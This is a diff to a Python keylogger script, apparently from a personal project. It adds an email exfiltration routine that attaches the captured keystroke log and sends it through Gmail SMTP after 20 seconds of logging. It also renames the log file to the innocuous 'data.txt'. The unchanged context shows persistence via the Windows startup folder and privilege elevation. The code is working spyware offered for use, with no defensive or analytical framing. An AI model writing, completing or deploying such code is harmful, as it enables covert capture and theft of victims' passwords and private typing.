@@ -2,7 +2,8 @@ import subprocess
 import os
 import sys
 import shutil
-requiredModules = ["pynput", "datetime", "pyuac"]
+import time
+requiredModules = ["pynput", "datetime", "pyuac", "secure-smtplib"]
 
 for module in requiredModules:
     try:
@@ -11,7 +12,15 @@ for module in requiredModules:
         subprocess.run(["pip", "install", module])
 
 from datetime import datetime
+from pynput import keyboard
 import pyuac
+import threading
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
 
 
 class Keylogger:
@@ -19,7 +28,50 @@ class Keylogger:
     def __init__(self):
         self.log = "Keylogger started ..."
 
-    # this are primary methods which should be done
+    # this are primary methods which ishould be done
+    #
+    #
+    #
+    def sendEmail(self):
+
+        # email config
+        senderEmail = ''
+        senderPassword = ''
+        smtpServer = 'smtp.gmail.com'
+        smtpPort = 587
+        toEmail = ''
+
+        # Now creating email message
+        message = MIMEMultipart()
+        message["From"] = senderEmail
+        message['To'] = toEmail
+        message['Subject'] = 'Key logs'
+
+        # attaching file which is keylogs.txt ignore the name
+        filePath = './data.txt'
+        attachment = open(filePath, 'rb')
+        base = MIMEBase('application', 'octet-stream')
+        base.set_payload(attachment.read())
+        encoders.encode_base64(base)
+        base.add_header('Content-Disposition', f'attachment; filename={filePath}')
+        message.attach(base)
+
+        # attaching the text body
+        message.attach(MIMEText('', 'plain'))
+        try:
+            # now sending email
+            with smtplib.SMTP(smtpServer, smtpPort) as server:
+                server.starttls()
+                server.login(senderEmail, senderPassword)
+                server.sendmail(senderEmail, toEmail, message.as_string())
+        except Exception as err:
+            print(err)
+
+
+
+
+
+
     def addToStartup(self):
         try:
             startupFolder = os.path.join(os.getenv("ProgramData"), "Microsoft", "Windows",
@@ -33,7 +85,7 @@ class Keylogger:
     # This are easy methods to understand
 
     def saveLogToFile(self, log):
-        with open("keylog.txt", "a") as file:
+        with open("data.txt", "a") as file:
             file.write(log)
             file.close()
 
@@ -73,7 +125,11 @@ if __name__ == "__main__":
                 pass
 
     obj = Keylogger()
-    obj.run()
+    threading.Thread(target=obj.run).start()
+
+    time.sleep(20)
+    obj.sendEmail()
+
         
 
 
